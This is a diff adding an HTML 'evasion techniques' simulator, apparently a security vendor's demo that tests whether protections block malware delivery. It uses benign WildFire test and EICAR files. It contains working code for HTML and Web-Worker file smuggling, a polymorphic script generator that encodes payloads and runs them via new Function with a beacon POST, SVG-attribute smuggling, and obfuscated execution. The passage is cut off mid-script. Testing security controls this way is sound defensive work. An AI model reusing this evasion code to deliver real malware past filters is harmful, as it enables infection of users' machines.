@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Evasion Techniques POV Simulator</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    
+    <style>
+        /* Light Blue, Curvy Aesthetic */
+        body {
+            margin: 0; padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f9f9;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1440 320'%3E%3Cpath fill='%23dcedf6' fill-opacity='0.6' d='M0,128L48,144C96,160,192,192,288,181.3C384,171,480,117,576,112C672,107,768,149,864,176C960,203,1056,213,1152,197.3C1248,181,1344,139,1392,117.3L1440,96L1440,0L1392,0C1344,0,1248,0,1152,0C1056,0,960,0,864,0C768,0,672,0,576,0C480,0,384,0,288,0C192,0,96,0,48,0L0,0Z'%3E%3C/path%3E%3Cpath fill='%23dcedf6' fill-opacity='0.5' d='M0,288L48,272C96,256,192,224,288,213.3C384,203,480,213,576,218.7C672,224,768,224,864,208C960,192,1056,160,1152,154.7C1248,149,1344,171,1392,181.3L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z'%3E%3C/path%3E%3C/svg%3E");
+            background-repeat: no-repeat; background-size: cover; background-attachment: fixed; color: #1a3c5a;
+        }
+
+        .top-bar {
+            display: flex; justify-content: space-between; align-items: center; background-color: rgba(255, 255, 255, 0.9);
+            padding: 12px 24px; font-weight: 600; font-size: 18px; box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            backdrop-filter: blur(8px); position: sticky; top: 0; z-index: 100;
+        }
+
+        .action-buttons { display: flex; gap: 10px; }
+        .nav-btn { cursor: pointer; font-size: 14px; font-weight: 600; padding: 6px 12px; border-radius: 12px; transition: 0.2s; border: none; }
+        .btn-reset { background: #e2e8f0; color: #1a3c5a; }
+        .btn-reset:hover { background: #cbd5e1; }
+        .btn-export { background: #4eb0c9; color: white; }
+        .btn-export:hover { background: #3a97ae; }
+
+        /* Dashboard Styles */
+        .dashboard {
+            background: #ffffff; border-radius: 16px; margin: 30px auto; max-width: 1100px; padding: 25px 30px;
+            box-shadow: 0 6px 20px rgba(130, 194, 209, 0.2); border: 1px solid #dcedf6;
+            display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; position: relative;
+        }
+
+        .dash-item { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; flex: 0 0 calc(25% - 20px); min-width: 140px; }
+        .dash-label { font-size: 13px; text-transform: uppercase; letter-spacing: 1px; color: #6b858e; font-weight: 700; white-space: nowrap;}
+        
+        .status-badge {
+            background-color: #e2e8f0; color: #475569; padding: 8px 16px; border-radius: 20px;
+            font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.2s; user-select: none;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05); width: 120px; text-align: center;
+        }
+        .status-badge:hover { transform: scale(1.05); }
+        .status-untested { background-color: #f1f5f9; color: #64748b; }
+        .status-fired { background-color: #fef08a; color: #854d0e; }
+        .status-blocked { background-color: #bbf7d0; color: #166534; }
+        .status-bypassed { background-color: #fecaca; color: #991b1b; }
+
+        .payload-indicator {
+            position: absolute; top: -12px; right: 20px; background: #1a3c5a; color: white;
+            font-size: 11px; padding: 4px 10px; border-radius: 12px; font-family: monospace;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .container { max-width: 1050px; margin: 0 auto 40px auto; padding: 0 20px; text-align: center; }
+
+        .test-section {
+            background: rgba(255, 255, 255, 0.7); border-radius: 24px; padding: 40px; margin-bottom: 40px;
+            box-shadow: 0 8px 32px rgba(130, 194, 209, 0.15); border: 1px solid rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(12px);
+        }
+
+        h1 { font-size: 24px; margin-bottom: 15px; color: #0b2031; }
+        p.desc { font-size: 15px; line-height: 1.6; color: #2b5c7e; max-width: 850px; margin: 0 auto 10px auto; }
+        code.inline { background: rgba(130, 194, 209, 0.2); padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.9em; }
+
+        .code-accordion { margin-top: 20px; text-align: left; }
+        .code-accordion summary {
+            cursor: pointer; font-weight: 600; font-size: 15px; color: #1a3c5a; padding: 10px 18px;
+            background: rgba(130, 194, 209, 0.2); border-radius: 20px; display: inline-flex; align-items: center;
+            transition: background 0.2s; user-select: none; list-style: none; 
+        }
+        .code-accordion summary::-webkit-details-marker { display: none; }
+        .code-accordion summary::before { content: "▶"; font-size: 10px; margin-right: 8px; color: #4eb0c9; transition: transform 0.2s; }
+        .code-accordion[open] summary::before { transform: rotate(90deg); }
+        .code-accordion summary:hover { background: rgba(130, 194, 209, 0.35); }
+
+        .code-container { display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-top: 15px; text-align: left; animation: fadeIn 0.3s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+
+        .code-block {
+            flex: 1; min-width: 300px; background-color: #f2f9fa; border: 1px solid #82c2d1; border-radius: 12px;
+            padding: 15px; font-family: 'Consolas', monospace; font-size: 12px; line-height: 1.5;
+            box-shadow: inset 0 2px 5px rgba(130, 194, 209, 0.1); overflow-x: auto;
+        }
+        .code-block.wide { flex: 0 0 100%; max-width: 600px; margin: 0 auto; }
+
+        .kw { color: #a11f4c; } .var { color: #215e7a; } .str { color: #1e6e43; } .cmt { color: #6b858e; font-style: italic; } .num { color: #005cc5; }
+
+        .demo-section { margin-top: 30px; padding-top: 20px; border-top: 1px dashed #b5d5de; }
+
+        .run-btn {
+            background-color: #4eb0c9; color: white; border: none; border-radius: 20px; padding: 10px 25px;
+            font-size: 15px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 10px rgba(78, 176, 201, 0.3);
+            transition: background-color 0.2s, transform 0.1s;
+        }
+        .run-btn:hover:not(:disabled) { background-color: #3a97ae; transform: translateY(-1px); }
+        .run-btn:active:not(:disabled) { transform: translateY(1px); }
+        .run-btn:disabled { background-color: #94a3b8; cursor: not-allowed; box-shadow: none; transform: none; }
+
+        .btn-danger { background-color: #e63946; box-shadow: 0 4px 10px rgba(230, 57, 70, 0.3); }
+        .btn-danger:hover:not(:disabled) { background-color: #d62828; }
+
+        .log {
+            margin-top: 15px; padding: 12px; background: rgba(255, 255, 255, 0.9); border-radius: 8px;
+            text-align: left; font-family: monospace; font-size: 12px; color: #333; max-height: 250px;
+            overflow-y: auto; border: 1px solid #dcedf6; display: none;
+        }
+        .dynamic-code { color: #0f172a; font-size: 12px; white-space: pre-wrap; word-break: break-all; background: #e2e8f0; padding: 10px; border-radius: 4px; border-left: 3px solid #3b82f6; margin: 5px 0; font-weight: bold;}
+        .mining-bar { width: 100%; height: 10px; background: #e2e8f0; border-radius: 5px; margin-top: 10px; overflow: hidden; display: none; }
+        .mining-progress { width: 0%; height: 100%; background: #e63946; transition: width 0.1s linear; }
+
+        /* Payload Modal Styles */
+        .payload-modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(11, 32, 49, 0.8); backdrop-filter: blur(5px);
+            display: none; justify-content: center; align-items: center; z-index: 1000;
+        }
+        .payload-modal {
+            background: white; border-radius: 16px; padding: 40px; max-width: 450px;
+            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border-top: 8px solid #ef4444; 
+            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .modal-icon { font-size: 48px; margin-bottom: 15px; }
+        .modal-title { font-size: 22px; color: #991b1b; margin-bottom: 10px; font-weight: 700; }
+        .modal-text { font-size: 15px; color: #334155; line-height: 1.5; margin-bottom: 25px; }
+        .modal-btn {
+            background-color: #ef4444; color: white; border: none; border-radius: 20px;
+            padding: 10px 30px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s;
+        }
+        .modal-btn:hover { background-color: #dc2626; }
+
+        /* Quishing Portal Styles */
+        .quish-portal {
+            background: #fdfdfd; border: 1px solid #d1d5db; border-radius: 8px; 
+            padding: 25px; max-width: 500px; margin: 30px auto 10px auto; text-align: left;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+        }
+        .quish-title { color: #c0392b; font-size: 18px; font-weight: bold; margin-top: 0; margin-bottom: 10px; }
+        .quish-subtitle { font-size: 14px; font-weight: 600; color: #333; margin-bottom: 20px; line-height: 1.4; }
+        .quish-row { display: flex; align-items: center; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #eee; }
+        .quish-row:last-child { border-bottom: none; padding-bottom: 0; }
+        .quish-link { color: #3498db; text-decoration: underline; font-size: 13px; font-weight: 500; cursor: pointer; text-align: center; line-height: 1.4;}
+        
+        .qr-container { position: relative; width: 90px; height: 90px; cursor: pointer; }
+        .quish-qr { width: 100%; height: 100%; border: 1px solid #ddd; padding: 4px; background: white; box-sizing: border-box;}
+        
+        .phone-overlay {
+            position: absolute; top: -30px; left: -15px; width: 120px; height: 150px;
+            background: rgba(0,0,0,0.85); border-radius: 12px; border: 3px solid #333;
+            display: flex; justify-content: center; align-items: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.2s ease, transform 0.2s ease;
+            transform: scale(0.95); z-index: 10; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        .qr-container:hover .phone-overlay { opacity: 1; transform: scale(1); }
+        .phone-screen { width: 90%; height: 90%; border: 1px solid #555; position: relative; overflow: hidden; }
+        .scan-line {
+            position: absolute; width: 100%; height: 2px; background: #22c55e;
+            box-shadow: 0 0 8px 2px rgba(34, 197, 94, 0.6); top: 0;
+            animation: scan 1.5s infinite linear;
+        }
+        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
+        .phone-text { color: white; font-size: 10px; position: absolute; bottom: 5px; width: 100%; text-align: center; font-family: sans-serif;}
+
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        Advanced Evasion Techniques POV Simulator
+        <div class="action-buttons">
+            <button class="nav-btn btn-export" onclick="exportScorecard()">Export Scorecard 📥</button>
+            <button class="nav-btn btn-reset" onclick="location.reload()">Reset Demo 🔄</button>
+        </div>
+    </div>
+
+    <div id="payloadModal" class="payload-modal-overlay">
+        <div class="payload-modal">
+            <div class="modal-icon">🚨</div>
+            <div class="modal-title">Malicious Payload Execution Successful</div>
+            <div class="modal-text">
+                The dynamically generated payload successfully bypassed network inspection and executed within the browser DOM. Active code and C2 beacons were deployed.
+            </div>
+            <button class="modal-btn" onclick="closePayloadModal()">Acknowledge</button>
+        </div>
+    </div>
+
+    <div class="dashboard" id="export-target">
+        <div id="payload-source-tag" class="payload-indicator">Loading Payload Engine...</div>
+        <div class="dash-item"><span class="dash-label">1. WW Chunking</span><div id="badge-chunk" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">2. WW Smuggling</span><div id="badge-smuggle" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">3. Polymorphic JS</span><div id="badge-poly" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">4. Quishing</span><div id="badge-quish" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">5. SVG Smuggling</span><div id="badge-svg" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">6. Crypto-Jacking</span><div id="badge-crypto" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">7. WebSocket</span><div id="badge-ws" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">8. Obfuscated JS</span><div id="badge-obfuscation" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+    </div>
+
+    <div class="container">
+
+        <div class="test-section">
+            <h1>Test 1: Web-Worker Malware Chunking</h1>
+            <p class="desc">The browser spawns a hidden background process (Web Worker) to pull data in chunks from the network. Reassembly happens completely off the main thread, bypassing legacy DOM-only inspection tools.</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startChunkTestBtn" class="run-btn" disabled>Loading...</button>
+                <div id="log1" class="log"></div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 2: Basic File Smuggling Attack</h1>
+            <p class="desc">A Base64 string representing a PE file is passed to a hidden background Web Worker. The worker decodes the payload deep in browser memory and returns the executable binary back to the main thread for execution.</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startSmuggleTestBtn" class="run-btn" disabled>Loading...</button>
+                <div id="log2" class="log"></div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 3: Runtime-Assembly via Polymorphic JavaScript</h1>
+            <p class="desc">A dynamic engine generates a <strong>completely unique, randomized script signature</strong> every time you click the button. It drops the payload and executes a simulated C2 beacon, demonstrating an active payload bypassing static network filters.</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startPolyTestBtn" class="run-btn" disabled>Loading...</button>
+                <div id="log3" class="log"></div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 4: Quishing Attacks - The Airgap Jump</h1>
+            <p class="desc">Adversaries embed malicious QR codes into legitimate websites. The attack begins on a corporate device, but shifts execution to an unmanaged mobile device during the scan.</p>
+            <div class="quish-portal">
+                <div class="quish-title">Get Started:</div>
+                <div class="quish-subtitle">Download the "PANW Mobile Access App" from the appropriate app store link below:</div>
+                <div class="quish-row">
+                    <div style="flex: 1; text-align: center; padding-right: 15px;"><a href="#" class="quish-trigger quish-link">iOS - PANW Mobile<br>Access App</a></div>
+                    <div class="qr-container quish-trigger">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=100x100&data=http://urlfiltering.paloaltonetworks.com/test-phishing" alt="iOS QR Code" class="quish-qr">
+                        <div class="phone-overlay"><div class="phone-screen"><div class="scan-line"></div><div class="phone-text">Scanning...</div></div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 5: Advanced HTML Smuggling (SVG Embedded Payload)</h1>
+            <p class="desc">Instead of storing the payload in a JavaScript variable, the attacker embeds the malicious Base64 code within the metadata of an invisible vector image (SVG) injected into the DOM. The script later extracts the payload from the image properties, completely bypassing gateway scanners.</p>
+            <details class="code-accordion">
+                <summary>View DOM Smuggling Logic</summary>
+                <div class="code-container">
+                    <div class="code-block wide">
+<span class="cmt">// Payload hidden inside an innocuous SVG tag property</span>
+<span class="kw">const</span> svg = document.<span class="var">createElementNS</span>(<span class="str">'http://www.w3.org/2000/svg'</span>, <span class="str">'svg'</span>);
+svg.<span class="var">setAttribute</span>(<span class="str">'data-malware-payload'</span>, b64_payload);
+document.body.<span class="var">appendChild</span>(svg);
+
+<span class="cmt">// Later, script extracts and drops the file</span>
+<span class="kw">const</span> extracted = document.<span class="var">querySelector</span>(<span class="str">'svg'</span>).<span class="var">getAttribute</span>(<span class="str">'data-malware-payload'</span>);
+<span class="var">triggerDownload</span>(<span class="var">atob</span>(extracted));
+                    </div>
+                </div>
+            </details>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startSvgTestBtn" class="run-btn" disabled>Loading...</button>
+                <div id="log5" class="log"></div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 6: Browser-Based Crypto-Jacking (Resource Hijacking)</h1>
+            <p class="desc">Malicious JavaScript execution does not always result in a file download. Attackers use hidden iframes or Web Workers to silently hijack the victim's CPU resources to mine cryptocurrency, degrading machine performance and costing the enterprise electricity and productivity.</p>
+            <p class="desc" style="font-weight: bold; color: #e63946;">Pro Tip: Open your machine's Task Manager / Activity Monitor before clicking Run to see the CPU spike!</p>
+            
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startCryptoTestBtn" class="run-btn btn-danger" disabled>Launch Simulated CPU Miner</button>
+                <div id="mining-bar" class="mining-bar"><div id="mining-progress" class="mining-progress"></div></div>
+                <div id="log6" class="log"></div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 7: Web Socket + Malware</h1>
+            <p class="desc">Network layer security can't inspect WebSocket connections because they're encrypted. Therefore, these solutions are completely blind to threats transmitted through these persistent connections.</p>
+            <p class="desc">The browser sends an HTTP request to the server, and the server responds with a Status Code 101 (Switching Protocols), upgrading the connection from standard HTTP to the bidirectional WebSocket protocol (ws:// or wss://).</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startWsTestBtn" class="run-btn" disabled>Loading...</button>
+                <div id="log7" class="log"></div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 8: Malicious Obfuscation (Obfuscated JavaScript)</h1>
+            <p class="desc">The script uses a large number of variables, each holding a small fragment of a string encoded with hexadecimal (<code>\x50\x47...</code>) or Unicode (<code>\u0046\u007a...</code>) escape sequences. This makes the text unreadable to a human or a network security scanner.</p>
+            <p class="desc">All fragments are concatenated into a single, massive obfuscated string. A function is defined to call <code>atob()</code> to Base64 decode it. The final, decoded content is then executed directly into the DOM, triggering a malicious file drop and active payload execution.</p>
+            <details class="code-accordion">
+                <summary>View Obfuscation Logic</summary>
+                <div class="code-container">
+                    <div class="code-block wide">
+<span class="kw">var</span> <span class="var">MoV0EGAe</span> = <span class="kw">function</span>(s) {
+  <span class="kw">return</span> <span class="var">atob</span>(s);
+};
+<span class="cmt">// Variables containing hex/unicode fragments of the Base64 script</span>
+<span class="kw">var</span> iouK_nAn = nY7MLAlg + z1rrdnSo + IouEedIh + hvp3Fatp + aFFXCLEi + eqaThGpC;
+<span class="cmt">// Payload executes immediately upon decoding</span>
+document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span> + <span class="var">MoV0EGAe</span>(iouK_nAn) + <span class="str">'&lt;/script&gt;'</span>);
+                    </div>
+                </div>
+            </details>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startObfuscationTestBtn" class="run-btn" disabled>Loading...</button>
+                <div id="log8" class="log"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // --- Dynamic Payload Manager ---
+        let GLOBAL_PAYLOAD_BYTES = null;
+        let GLOBAL_PAYLOAD_B64 = "";
+        let GLOBAL_FILENAME = "payload.exe";
+
+        const WILDFIRE_URL = "https://wildfire.paloaltonetworks.com/publicapi/test/pe";
+        const FALLBACK_EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+
+        async function initializePayloadEngine() {
+            const indicator = document.getElementById('payload-source-tag');
+            try {
+                const response = await fetch(WILDFIRE_URL);
+                if (!response.ok) throw new Error('Network block');
+                const buffer = await response.arrayBuffer();
+                GLOBAL_PAYLOAD_BYTES = new Uint8Array(buffer);
+                
+                let binary = '';
+                for (let i = 0; i < GLOBAL_PAYLOAD_BYTES.byteLength; i++) binary += String.fromCharCode(GLOBAL_PAYLOAD_BYTES[i]);
+                GLOBAL_PAYLOAD_B64 = btoa(binary);
+                GLOBAL_FILENAME = "wildfire_test.pe";
+                
+                indicator.innerText = "Payload: Authentic Wildfire PE";
+                indicator.style.background = "#166534"; 
+            } catch (error) {
+                indicator.innerText = "Payload: Offline EICAR Fallback";
+                indicator.style.background = "#854d0e"; 
+                GLOBAL_PAYLOAD_BYTES = new TextEncoder().encode(FALLBACK_EICAR);
+                GLOBAL_PAYLOAD_B64 = btoa(FALLBACK_EICAR);
+                GLOBAL_FILENAME = "eicar_test.txt";
+            }
+
+            document.querySelectorAll('.run-btn').forEach(btn => {
+                btn.disabled = false;
+                if(btn.id === 'startChunkTestBtn') btn.innerText = "Run Worker Chunking";
+                if(btn.id === 'startSmuggleTestBtn') btn.innerText = "Run Worker Smuggling";
+                if(btn.id === 'startPolyTestBtn') btn.innerText = "Run Polymorphic Generation";
+                if(btn.id === 'startSvgTestBtn') btn.innerText = "Run SVG Smuggling";
+                if(btn.id === 'startCryptoTestBtn') btn.innerText = "Launch Simulated CPU Miner";
+                if(btn.id === 'startWsTestBtn') btn.innerText = "Run WebSocket Malware";
+                if(btn.id === 'startObfuscationTestBtn') btn.innerText = "Run Obfuscated JS";
+            });
+        }
+        window.onload = initializePayloadEngine;
+
+        // --- UI & Dashboard Logic ---
+        function setBadgeStatus(badgeId, statusClass, text) {
+            const badge = document.getElementById(badgeId);
+            badge.className = `status-badge ${statusClass}`;
+            badge.innerText = text;
+            badge.dataset.state = statusClass; 
+        }
+
+        function toggleBadge(element) {
+            const currentState = element.dataset.state;
+            if (currentState === 'status-blocked') {
+                element.className = 'status-badge status-bypassed';
+                element.innerText = 'Bypassed ❌';
+                element.dataset.state = 'status-bypassed';
+            } else {
+                element.className = 'status-badge status-blocked';
+                element.innerText = 'Blocked 🛡️';
+                element.dataset.state = 'status-blocked';
+            }
+        }
+
+        function toggleBtnState(btnId, isRunning, defaultText) {
+            const btn = document.getElementById(btnId);
+            if (isRunning) {
+                btn.disabled = true;
+                btn.innerText = "Executing...";
+            } else {
+                btn.disabled = false;
+                btn.innerText = defaultText;
+            }
+        }
+
+        function updateLog(elId, msg, clear=false) {
+            const el = document.getElementById(elId);
+            if (clear) el.innerHTML = '';
+            el.style.display = 'block';
+            el.innerHTML += `[+] ${msg}<br>`;
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function triggerDownload(dataArray, filename) {
+            const blob = new Blob([dataArray], { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename; 
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 100);
+        }
+
+        // Parameterized popup function to dynamically update the correct dashboard badge
+        window.triggerEvasionPopup = function(targetBadgeId) {
+            document.getElementById('payloadModal').style.display = 'flex';
+            if (targetBadgeId) {
+                setBadgeStatus(targetBadgeId, 'status-fired', 'Payload Executed ⚠️');
+            }
+        };
+        function closePayloadModal() { document.getElementById('payloadModal').style.display = 'none'; }
+
+        async function exportScorecard() {
+            const dash = document.getElementById('export-target');
+            const tag = document.getElementById('payload-source-tag');
+            tag.style.display = 'none';
+            try {
+                const canvas = await html2canvas(dash, { backgroundColor: '#ffffff', scale: 2 });
+                const link = document.createElement('a');
+                link.download = 'Evasion_Scorecard.png';
+                link.href = canvas.toDataURL('image/png');
+                link.click();
+            } finally { tag.style.display = 'block'; }
+        }
+
+        function runInWebWorker(workerCodeString, messageData) {
+            return new Promise((resolve, reject) => {
+                const blob = new Blob([workerCodeString], { type: 'application/javascript' });
+                const worker = new Worker(URL.createObjectURL(blob));
+                worker.onmessage = (e) => { resolve(e.data); worker.terminate(); };
+                worker.onerror = (e) => { reject(e); worker.terminate(); };
+                worker.postMessage(messageData);
+            });
+        }
+
+        // --- TEST 1: Web Worker Chunking ---
+        document.getElementById('startChunkTestBtn').addEventListener('click', async () => {
+            const btnId = 'startChunkTestBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log1', '', true); 
+            setBadgeStatus('badge-chunk', 'status-fired', 'Payload Sent ⚠️');
+            
+            updateLog('log1', `Starting network stream of ${GLOBAL_FILENAME}...`);
+            let chunks = [], position = 0;
+            while(position < GLOBAL_PAYLOAD_BYTES.length) {
+                const end = Math.min(position + 50, GLOBAL_PAYLOAD_BYTES.length);
+                chunks.push(GLOBAL_PAYLOAD_BYTES.slice(position, end).buffer); 
+                position += 50;
+            }
+            
+            updateLog('log1', `Spawning background Web Worker thread...`);
+            
+            const workerCode = `
+                onmessage = function(e) {
+                    const chunks = e.data;
+                    const totalLength = chunks.reduce((acc, c) => acc + c.byteLength, 0);
+                    const combined = new Uint8Array(totalLength);
+                    let offset = 0;
+                    for (let chunk of chunks) {
+                        combined.set(new Uint8Array(chunk), offset);
+                        offset += chunk.byteLength;
+                    }
+                    postMessage(combined.buffer, [combined.buffer]);
+                }
+            `;
+
+            try {
+                await new Promise(r => setTimeout(r, 800)); 
+                const assembledBuffer = await runInWebWorker(workerCode, chunks);
+                updateLog('log1', 'Worker successfully reassembled binary payload. Triggering download...');
+                triggerDownload(new Uint8Array(assembledBuffer), `chunked_${GLOBAL_FILENAME}`);
+            } catch(e) { updateLog('log1', 'Worker error: ' + e); }
+            toggleBtnState(btnId, false, "Run Worker Chunking");
+        });
+
+        // --- TEST 2: Web Worker Smuggling ---
+        document.getElementById('startSmuggleTestBtn').addEventListener('click', async () => {
+            const btnId = 'startSmuggleTestBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log2', '', true);
+            setBadgeStatus('badge-smuggle', 'status-fired', 'Payload Sent ⚠️');
+            
+            updateLog('log2', 'Spawning background Web Worker thread...');
+            const workerCode = `
+                onmessage = function(e) {
+                    const b64 = e.data;
+                    const binStr = atob(b64);
+                    const bytes = new Uint8Array(binStr.length);
+                    for (let i = 0; i < binStr.length; i++) bytes[i] = binStr.charCodeAt(i);
+                    postMessage(bytes.buffer, [bytes.buffer]);
+                }
+            `;
+            try {
+                await new Promise(r => setTimeout(r, 800));
+                const decodedBuffer = await runInWebWorker(workerCode, GLOBAL_PAYLOAD_B64);
+                updateLog('log2', 'Worker successfully decoded Base64 payload. Triggering download...');
+                triggerDownload(new Uint8Array(decodedBuffer), `smuggled_${GLOBAL_FILENAME}`);
+            } catch(e) { updateLog('log2', 'Worker error: ' + e); }
+            toggleBtnState(btnId, false, "Run Worker Smuggling");
+        });
+
+        // --- TEST 3: Polymorphic Scrambler Engine ---
+        function generatePolymorphicScript(targetPayload) {
+            let script = ""; let vars = []; let i = 0;
+            const randVar = () => '_' + Math.random().toString(36).substr(2, 6);
+            while (i < targetPayload.length) {
+                let chunkSize = Math.floor(Math.random() * 30) + 5; 
+                let chunk = targetPayload.substring(i, i + chunkSize);
+                i += chunkSize;
+                let varName = randVar();
+                vars.push(varName);
+                let encType = Math.floor(Math.random() * 4);
+                if (encType === 0) script += `const ${varName} = atob('${btoa(chunk)}');\n`;
+                else if (encType === 1) script += `const ${varName} = String.fromCharCode(${Array.from(chunk).map(c=>c.charCodeAt(0)).join(',')});\n`;
+                else if (encType === 2) script += `const ${varName} = decodeURIComponent('${encodeURIComponent(chunk).replace(/'/g,"%27")}');\n`;
+                else script += `const ${varName} = '${Array.from(chunk).map(c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('')}';\n`;
+            }
+            let assembledStrVar = randVar();
+            script += `const ${assembledStrVar} = ${vars.join(' + ')};\nnew Function(${assembledStrVar})();\n`;
+            return script;
+        }
+
+        async function matrixScramble(elementId, finalCode) {
+            const el = document.getElementById(elementId);
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*()<>{}[]';
+            const displayLen = Math.min(finalCode.length, 300);
+            const endTime = Date.now() + 1500; 
+            return new Promise(resolve => {
+                const interval = setInterval(() => {
+                    if (Date.now() > endTime) {
+                        clearInterval(interval);
+                        el.innerText = finalCode.substring(0, 300) + '\n... [TRUNCATED ' + finalCode.length + ' BYTES]';
+                        resolve();
+                    } else {
+                        let gibberish = '';
+                        for(let i=0; i<displayLen; i++) gibberish += chars[Math.floor(Math.random() * chars.length)];
+                        el.innerText = gibberish;
+                    }
+                }, 40);
+            });
+        }
+
+        document.getElementById('startPolyTestBtn').addEventListener('click', async () => {
+            const btnId = 'startPolyTestBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log3', '', true);
+            
+            // This target JS drops the PE file, beacons out, and specifically triggers the 'badge-poly' update on the dashboard via the popup
+            const targetJS = `const payloadB64='${GLOBAL_PAYLOAD_B64}';const binaryString=atob(payloadB64);const bytes=new Uint8Array(binaryString.length);for(let i=0;i<binaryString.length;i++){bytes[i]=binaryString.charCodeAt(i);}const blob=new Blob([bytes],{type:'application/octet-stream'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download='poly_${GLOBAL_FILENAME}';document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(url);},100);fetch('https://wildfire.paloaltonetworks.com/publicapi/test/pe',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'payload_executed'})}).catch(e=>console.log('C2 beacon fired.'));window.triggerEvasionPopup('badge-poly');`;
+            
+            updateLog('log3', 'Requesting dynamic JS payload generation from engine...');
+            const uniqueScriptStr = generatePolymorphicScript(targetJS);
+            const codeContainerId = 'dynamic-code-block-' + Date.now();
+            updateLog('log3', `<div id="${codeContainerId}" class="dynamic-code">INITIALIZING GENERATOR...</div>`);
+            
+            await matrixScramble(codeContainerId, uniqueScriptStr);
+            updateLog('log3', 'Unique script locked in. Executing dynamic payload in memory...');
+            
+            try {
+                await new Promise(r => setTimeout(r, 600)); 
+                const runner = new Function(uniqueScriptStr);
+                runner();
+                updateLog('log3', 'Execution complete.');
+            } catch (e) { updateLog('log3', 'Execution error: ' + e.message); }
+            toggleBtnState(btnId, false, "Run Polymorphic Generation");
+        });
+
+        // --- TEST 4: QUISHING LOGIC ---
+        document.querySelectorAll('.quish-trigger').forEach(trigger => {
